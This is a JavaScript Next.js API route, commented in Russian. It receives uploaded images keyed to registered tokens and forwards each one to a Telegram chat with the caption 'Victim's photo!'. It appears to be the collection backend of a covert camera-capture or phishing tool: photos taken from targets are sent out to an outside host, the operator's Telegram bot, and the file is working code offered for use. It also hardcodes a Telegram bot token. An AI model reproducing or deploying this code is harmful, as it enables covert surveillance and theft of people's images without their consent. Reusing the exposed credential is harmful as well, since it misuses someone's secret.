import formidable from 'formidable';
import fs from 'fs';
import path from 'path';

export const config = {
    api: {
        bodyParser: false,
    },
};

const BOT_TOKEN = "8255755052:AAFjHxgUKDccQVi33kWGuUXkARcR85CxXDQ";
const DATA_FILE = path.join(process.cwd(), 'data', 'tokens.json');

function getChatIdByToken(token) {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = fs.readFileSync(DATA_FILE, 'utf8');
            const tokens = JSON.parse(data);
            return tokens[token];
        }
    } catch (e) {
        console.error('Error reading tokens:', e);
    }
    return null;
}

export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Origin', '*');
    
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const form = formidable({ multiples: false });
        
        const [fields, files] = await new Promise((resolve, reject) => {
            form.parse(req, (err, fields, files) => {
                if (err) reject(err);
                resolve([fields, files]);
            });
        });

        const imageFile = files.image;
        const token = fields.token?.[0];

        if (!imageFile || !token) {
            return res.status(400).json({ error: 'Missing data' });
        }

        console.log(`📸 Получено фото для токена: ${token}`);

        // Получаем chat_id владельца токена
        const chatId = getChatIdByToken(token);
        
        if (!chatId) {
            console.log(`❌ Токен ${token} не найден`);
            return res.status(404).json({ error: 'Token not registered' });
        }

        // Читаем фото
        const imageData = fs.readFileSync(imageFile.filepath);
        
        // Отправляем в Telegram
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', new Blob([imageData]), 'photo.jpg');
        formData.append('caption', `📸 Фото жертвы!\n🕒 ${new Date().toLocaleString()}`);

        const tgResponse = await fetch(
            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
            { method: 'POST', body: formData }
        );

        const tgData = await tgResponse.json();
        console.log('Telegram response:', tgData);

        // Удаляем временный файл
        fs.unlinkSync(imageFile.filepath);

        res.status(200).json({ success: true });

    } catch (error) {
        console.error('Error:', error);
        res.status(500).json({ error: error.message });
    }
}
